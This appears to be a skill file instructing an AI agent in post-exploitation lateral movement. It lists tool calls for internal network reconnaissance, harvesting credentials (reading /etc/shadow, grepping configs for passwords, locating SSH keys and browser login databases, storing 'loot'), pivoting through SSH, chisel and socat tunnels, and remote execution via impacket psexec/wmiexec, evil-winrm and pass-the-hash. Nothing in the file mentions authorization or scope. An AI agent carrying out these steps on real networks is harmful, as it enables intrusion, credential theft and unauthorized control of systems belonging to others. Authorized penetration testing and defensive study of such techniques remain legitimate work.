---
name: lateral-movement
description: Post-exploitation lateral movement — credential relay, pivoting, pass-the-hash, WMI/PSExec, SSH tunneling, port forwarding
---

# Lateral Movement Skill

Move laterally through a network after initial compromise.

## Phase 1: Internal Reconnaissance
1. Use `execute_command`: `ip addr && ip route && cat /etc/resolv.conf`
2. Use `execute_command`: `arp -a` (discover adjacent hosts)
3. Use `port_scanner` on internal subnets (192.168.x.0/24, 10.0.0.0/24, 172.16.0.0/16)
4. Use `execute_command`: `nmap -sn 192.168.1.0/24` (ping sweep)
5. Use `execute_command`: `cat /etc/hosts` (known hosts)
6. Use `network_sniffer` mode "connections" to map internal connections

## Phase 2: Credential Harvesting
7. Use `execute_command`: `cat /etc/shadow 2>/dev/null` (password hashes)
8. Use `execute_command`: `find / -name "*.conf" -exec grep -l "password\|passwd\|pwd" {} \; 2>/dev/null`
9. Use `execute_command`: `cat ~/.ssh/known_hosts` (known SSH hosts)
10. Use `execute_command`: `find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null`
11. Browser credential extraction: `execute_command`: `find / -name "Login Data" -o -name "logins.json" 2>/dev/null`
12. Store credentials with `memory_store` action "store_loot"

## Phase 3: Pivoting Techniques
13. SSH tunnel: `execute_command`: `ssh -D 1080 -N user@pivot_host` (SOCKS proxy)
14. SSH port forward: `execute_command`: `ssh -L 8888:internal_target:80 user@pivot_host`
15. Chisel: `execute_command`: `./chisel server -p 8000 --reverse` (reverse tunnel)
16. socat relay: `execute_command`: `socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET:PORT`
17. Use `execute_command`: `proxychains nmap -sT -Pn internal_target` (scan through proxy)

## Phase 4: Remote Execution
18. PSExec: `execute_command`: `impacket-psexec admin:password@target`
19. WMI: `execute_command`: `impacket-wmiexec admin:password@target`
20. WinRM: `execute_command`: `evil-winrm -i target -u admin -p password`
21. SSH: `execute_command`: `sshpass -p 'password' ssh user@target`
22. Pass-the-Hash: `execute_command`: `impacket-psexec -hashes LM:NT admin@target`
23. SMB: `execute_command`: `smbclient //target/C$ -U admin%password`

## Phase 5: Network Mapping
24. Build network map of compromised hosts and paths
25. Document all pivot points and credentials used
26. Save network diagram and findings with `save_artifact`
